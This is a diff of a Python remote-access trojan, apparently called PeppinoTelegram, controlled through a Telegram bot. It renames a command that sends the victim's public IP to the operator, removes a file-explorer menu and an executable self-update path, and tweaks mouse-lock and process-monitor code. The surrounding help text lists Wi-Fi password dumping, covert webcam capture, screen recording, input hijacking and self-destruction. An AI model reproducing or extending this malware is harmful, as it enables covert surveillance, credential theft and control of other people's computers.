@@ -232,7 +232,7 @@ selfdestruction - Removes the program from the machine permanently.
 
 🌐 Network & Remote Access
 wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
-ipinfo - Get public IP and geolocation.
+getip - Get public IP and geolocation.
 
 📸 Camera & Screen
 selfie - Take a webcam selfie.
@@ -276,9 +276,6 @@ terminateprocess - Kills a process by name.
 procmonmenu - Shows procmon menu.
 procmonadd - Adds a process to the process monitor list.
 procmonrem - Removes a process to the process monitor list.
-
-📂 File Explorer
-fileexplorer - Displays a file explorer menu.
 
 🎮 Input / Device Control
 randomkeyboard - Sets all user's input to random characters.
@@ -1024,7 +1021,7 @@ class PeppinoTelegram:
             "distortedscreen":self.distorted_screen,
             "displaymode":self.display_mode,
             "jumpscarenoaudio":self.jumpscarenoaudio,
-            "ipinfo":self.ipinfo,
+            "getip":self.getip,
             "mouselock":self.mouselock,
             #"keyboardlock":self.keyboardlock,
             "fullclip":self.record_webcam_and_screen,
@@ -1207,7 +1204,7 @@ class PeppinoTelegram:
     def inverted_screen(self) -> None:
         self.modded_screenshot(invert_image)
 
-    def ipinfo(self):
+    def getip(self):
         output = self.execute("curl ifconfig.co", return_output=True)
         self.bsend(f"🌐 Public IP: {output}")
 
@@ -1324,7 +1321,7 @@ class PeppinoTelegram:
         pos = pg.position()
         pg.moveTo(pos[0], pos[1]-MOUSE_JMP)
 
-    def mouselock(self, timer: int) -> None:
+    def mouselock(self, timer: int=6) -> None:
         start = time()
         pos = pg.position()
         while timer > (time()-start):
@@ -1443,13 +1440,6 @@ class PeppinoTelegram:
         self.bot.download_file(file_id, saved_filepath)
         if mimetype == "document": 
             filename = document["file_name"]
-            if update_exe and not(filename.endswith(".exe")):
-                self.bsend("You did not send an executable file.")
-            elif update_exe and filename.endswith(".exe"):
-                self.bsend("Installing new .exe")
-                self.update_exe_function(filename)
-                return
-
             if filename.endswith(".dd"):
                 with open(saved_filepath, "r") as fi:
                     content = fi.read()
@@ -1528,7 +1518,7 @@ class PeppinoTelegram:
                     self.processmonitorlist[process]=True
                 elif not(self.check_if_proc_running(process)):
                     self.processmonitorlist[process]=False
-            sleep(1)
+            sleep(2)
 
     def process_killer(self, page=0) -> None:
         if self.process_explorer_menu is None:
@@ -1566,7 +1556,6 @@ class PeppinoTelegram:
         ["/execute", "/processkiller"],
         ["/terminateprocess", "/procmonmenu"],
         ["/procmonadd", "/procmonrem"],
-        ["/filexplorer"],
         ["/randomkeyboard", "/capslock"],
         ["/mousecontroller", "/mouselock"],
         ["/bsend", "/id"],
